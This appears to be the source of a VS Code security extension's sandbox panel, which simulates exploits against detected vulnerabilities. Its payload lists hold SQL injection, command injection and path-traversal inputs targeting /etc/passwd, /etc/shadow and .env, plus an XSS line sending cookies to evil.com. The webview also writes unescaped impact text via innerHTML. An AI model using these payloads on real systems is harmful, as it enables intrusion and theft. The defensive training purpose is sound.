import * as vscode from 'vscode';
import { Issue, simulateExploit } from './apiClient';

function formatType(raw: string): string {
  const map: Record<string, string> = {
    'SQL_INJECTION': 'SQL Injection',
    'XSS': 'Cross-Site Scripting (XSS)',
    'COMMAND_INJECTION': 'Command Injection',
    'PATH_TRAVERSAL': 'Path Traversal',
    'HARDCODED_SECRET': 'Hardcoded Secret',
    'WEAK_RANDOMNESS': 'Weak Randomness',
    'INSECURE_DESERIAL': 'Insecure Deserialization',
    'CSRF': 'CSRF',
    'SSRF': 'SSRF',
  };
  return map[raw] || raw.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
}

function esc(s: string): string {
  return (s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function getSuggestions(type: string): string[] {
  const t = type.toLowerCase();
  if (t.includes('sql')) {
    return ["' OR 1=1 --", "' UNION SELECT username,password FROM users --", "admin' --", "'; DROP TABLE users; --"];
  }
  if (t.includes('xss') || t.includes('cross') || t.includes('script')) {
    return ["<svg/onload=alert(1)>", "<script>fetch('https://evil.com?c='+document.cookie)</script>", "<img src=x onerror=alert(document.domain)>"];
  }
  if (t.includes('command')) {
    return ["127.0.0.1; whoami", "127.0.0.1 && cat /etc/passwd", "127.0.0.1 | id"];
  }
  if (t.includes('path') || t.includes('traversal')) {
    return ["../../../etc/passwd", "../../../../etc/shadow", "../../../../app/.env"];
  }
  return ["' OR 1=1 --", "<script>alert(1)</script>"];
}

export class SimulationPanel {
  public static currentPanel: SimulationPanel | undefined;
  private readonly _panel: vscode.WebviewPanel;
  private readonly _extensionUri: vscode.Uri;
  private _disposables: vscode.Disposable[] = [];
  private _issue: Issue | undefined;

  public static createOrShow(extensionUri: vscode.Uri, issue: Issue) {
    const column = vscode.window.activeTextEditor
      ? vscode.window.activeTextEditor.viewColumn
      : undefined;

    if (SimulationPanel.currentPanel) {
      SimulationPanel.currentPanel._panel.reveal(column);
      SimulationPanel.currentPanel.update(issue);
      return;
    }

    const panel = vscode.window.createWebviewPanel(
      'codeshieldSimulation',
      'CodeShield Sandbox',
      column || vscode.ViewColumn.One,
      { enableScripts: true, localResourceRoots: [extensionUri] }
    );

    SimulationPanel.currentPanel = new SimulationPanel(panel, extensionUri);
    SimulationPanel.currentPanel.update(issue);
  }

  private constructor(panel: vscode.WebviewPanel, extensionUri: vscode.Uri) {
    this._panel = panel;
    this._extensionUri = extensionUri;
    this._panel.onDidDispose(() => this.dispose(), null, this._disposables);

    this._panel.webview.onDidReceiveMessage(async (msg) => {
      if (msg.type === 'runSim' && this._issue) {
        const result = await simulateExploit({
          vuln_type: this._issue.type,
          payload: msg.payload,
          code_snippet: this._issue.code_snippet || '',
          language: 'javascript'
        });

        if (result) {
          this._panel.webview.postMessage({
            type: 'simResult',
            query: result.query,
            attackResult: result.attack_result,
            attackClass: result.attack_class,
            isAttack: result.is_attack,
            impact: result.impact
          });
        }
      }
    }, null, this._disposables);
  }

  public update(issue: Issue) {
    this._issue = issue;
    this._panel.title = `Sandbox: ${issue.type}`;
    this._panel.webview.html = this.getHtmlForWebview(this._panel.webview, issue);
  }

  public dispose() {
    SimulationPanel.currentPanel = undefined;
    this._panel.dispose();
    while (this._disposables.length) {
      const x = this._disposables.pop();
      if (x) { x.dispose(); }
    }
  }

  private getNonce() {
    let text = '';
    const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < 32; i++) { text += possible.charAt(Math.floor(Math.random() * possible.length)); }
    return text;
  }

  private defaultPayload(type: string): string {
    const t = (type || '').toLowerCase();
    if (t.includes('sql')) { return "' UNION SELECT id, username, password FROM users --"; }
    if (t.includes('xss') || t.includes('cross') || t.includes('script')) { return '<svg/onload=alert(1)>'; }
    if (t.includes('command') || t.includes('exec')) { return '127.0.0.1; whoami'; }
    if (t.includes('path') || t.includes('traversal') || t.includes('lfi')) { return '../../../etc/passwd%00'; }
    if (t.includes('secret') || t.includes('hardcoded') || t.includes('key')) { return 'AKIAIOSFODNN7EXAMPLE'; }
    if (t.includes('random') || t.includes('crypto')) { return '0.7381'; }
    return 'malicious_input';
  }

  private getHtmlForWebview(webview: vscode.Webview, issue: Issue): string {
    const nonce = this.getNonce();
    const typeLabel = formatType(issue.type);
    const payload = esc(issue.simulation?.payload || this.defaultPayload(issue.type));
    const suggestions = getSuggestions(issue.type);
    const suggestionJson = JSON.stringify(suggestions).replace(/</g, '\\x3c').replace(/>/g, '\\x3e');

    // Mapped strictly to VS Code CSS Variables
    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-${nonce}';">
<style>
/* ─── VS Code Native + Modern Tokens ─── */
:root {
  --cs-radius: 12px;
  --cs-pill: 99px;
  --cs-trans: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1);
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family: var(--vscode-font-family, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif);
  padding:32px 24px;
  background: var(--vscode-editor-background);
  color: #ffffff;
  font-size: 15px;
  display:flex; justify-content:center; line-height:1.5;
}
.wrap{max-width:720px;width:100%;}

/* ─── Header ─── */
.header { display: flex; align-items: center; gap: 16px; padding-bottom: 24px; border-bottom: 1px solid var(--vscode-widget-border, rgba(128,128,128,0.2)); margin-bottom: 32px; }
.header-icon { font-size: 32px; flex-shrink: 0; }
.header-title { font-size: 28px; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.5px; color: #ffffff; }
.header-sub { font-size: 15px; color: var(--vscode-descriptionForeground, #9ca3af); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }

/* ─── Cards ─── */
.card {
  background: #252526; /* Dark VS Code widget-like */
  border: 1px solid #333333;
  border-radius: 8px;
  padding: 24px; margin-bottom: 24px;
}
.card-title { font-size: 13px; font-weight: 700; text-transform: uppercase; color: #9ca3af; margin-bottom: 12px; letter-spacing: 0.5px; }

/* ─── Inputs ─── */
textarea {
  width: 100%; background: #1e1e1e; color: #ffffff;
  border: 1px solid #3c3c3c;
  border-radius: 6px; padding: 16px; font-family: var(--vscode-editor-font-family, monospace); font-size: 14px; outline: none; resize: vertical; min-height: 120px; transition: border-color 0.2s;
}
textarea:focus { border-color: #0F4C81; }
textarea::placeholder { color: #6b7280; }

/* ─── Pills / Chips ─── */
.sug-wrap { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
.sug-label { font-size: 13px; color: #d1d5db; font-weight: 500; margin-top: 20px; }
.sug {
  background: transparent; color: #ffffff;
  border: 1px solid #4b5563; border-radius: var(--cs-pill);
  padding: 6px 14px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s;
}
.sug:hover { background: #374151; }

/* ─── Action Button ─── */
.btn-run {
  display: flex; justify-content: center; align-items: center; gap: 12px;
  width: 100%; padding: 14px; margin: 12px 0 32px;
  background: #0F4C81; color: #FFF;
  border: none; border-radius: 99px;
  font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s;
}
.btn-run:hover { background: #0c3b66; }
.btn-run:active { transform: translateY(1px); }
.btn-run.loading { opacity: 0.7; pointer-events: none; }

/* ─── Result Panes ─── */
.pbox {
  background: #1e1e1e; color: #ffffff;
  border: 1px solid #333333;
  border-radius: 6px; padding: 16px; font-family: var(--vscode-editor-font-family, monospace); font-size: 14px; white-space: pre-wrap; word-break: break-all; min-height: 64px; margin-bottom: 24px;
}
.pbox:last-child { margin-bottom: 0; }
.empty-hint { color: #9ca3af; font-style: italic; font-size: 13px; }

/* ─── Badges ─── */
.badge { display: inline-block; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 16px; }
.badge.safe { background: #22c55e; color: #ffffff; }
.badge.attack { background: #f43f5e; color: #ffffff; }

/* ─── Impact List ─── */
.impact-list { list-style: none; padding: 0; margin: 0; }
.impact-list li { font-size: 15px; font-weight: 500; padding: 6px 0; display: flex; align-items: flex-start; gap: 8px; color: #ffffff; }
.impact-list li::before { content: "•"; color: #9ca3af; }
</style>
</head>
<body>
<div class="wrap">

  <div class="header">
    <div class="header-icon">🧪</div>
    <div>
      <div class="header-title">Interactive Sandbox</div>
      <div class="header-sub">Target: ${esc(typeLabel)}</div>
    </div>
  </div>

  <div class="card">
    <div class="card-title">Attacker Payload</div>
    <textarea id="pay" placeholder="Enter custom injection payload...">${payload}</textarea>
    <div class="sug-label">Try these payloads:</div>
    <div class="sug-wrap" id="sugs"></div>
  </div>

  <button class="btn-run" id="btn">⚡ Run Simulation</button>

  <div id="resWrap" class="card" style="display:none">
    <div id="classTag"></div>
    <div class="card-title">System Context</div>
    <div class="pbox" id="q"></div>
    <div class="card-title">Execution Result</div>
    <div class="pbox" id="res"></div>
    <div class="card-title" style="margin-top:24px">Impact Analysis</div>
    <ul class="impact-list" id="im"></ul>
  </div>

</div>

<script nonce="${nonce}">
(function() {
  var vsc  = acquireVsCodeApi();
  var sugs = ${suggestionJson};

  var sugEl = document.getElementById('sugs');
  sugs.forEach(function(s) {
    var chip = document.createElement('button');
    chip.className = 'sug';
    chip.textContent = s;
    chip.addEventListener('click', function() {
      document.getElementById('pay').value = s;
    });
    sugEl.appendChild(chip);
  });

  document.getElementById('btn').addEventListener('click', function() {
    var btn = document.getElementById('btn');
    if (btn.classList.contains('loading')) return;
    btn.classList.add('loading');
    btn.textContent = 'Running Simulation...';

    var resWrap = document.getElementById('resWrap');
    resWrap.style.display = 'block';
    
    document.getElementById('classTag').innerHTML = '';
    
    var qEl   = document.getElementById('q');
    var resEl = document.getElementById('res');
    qEl.className   = 'pbox';
    qEl.textContent = 'Simulating execution...';
    resEl.className = 'pbox';
    resEl.textContent = 'Analyzing system responses...';
    document.getElementById('im').innerHTML = '';

    vsc.postMessage({ type: 'runSim', payload: document.getElementById('pay').value });
  });

  window.addEventListener('message', function(e) {
    var d = e.data;
    if (d.type !== 'simResult') { return; }

    var btn = document.getElementById('btn');
    btn.classList.remove('loading');
    btn.textContent = '⚡ Run Simulation';

    var classTag = document.getElementById('classTag');
    classTag.className = 'badge fade-in ' + (d.isAttack ? 'attack' : 'safe');
    classTag.textContent = d.isAttack ? '🎯 ' + d.attackClass : '✅ Safe';

    var qEl = document.getElementById('q');
    qEl.className = 'pbox fade-in';
    qEl.textContent = d.query;

    var resEl = document.getElementById('res');
    resEl.className = 'pbox fade-in';
    resEl.textContent = d.attackResult;

    var impactLines = [];
    if (d.impact) {
      impactLines = d.impact.split(/[.;,]/).map(function(s){ return s.trim(); }).filter(function(s){ return s.length > 3; }).slice(0, 4);
    }
    if (!impactLines.length) { impactLines = [d.impact || (d.isAttack ? 'Sensitive data may be exposed' : 'No exploit triggered')]; }

    var lis = impactLines.map(function(l) { return '<li class="fade-in">' + l + '</li>'; }).join('');
    document.getElementById('im').innerHTML = lis;
  });
}());
</script>
</body>
</html>`;
  }
}
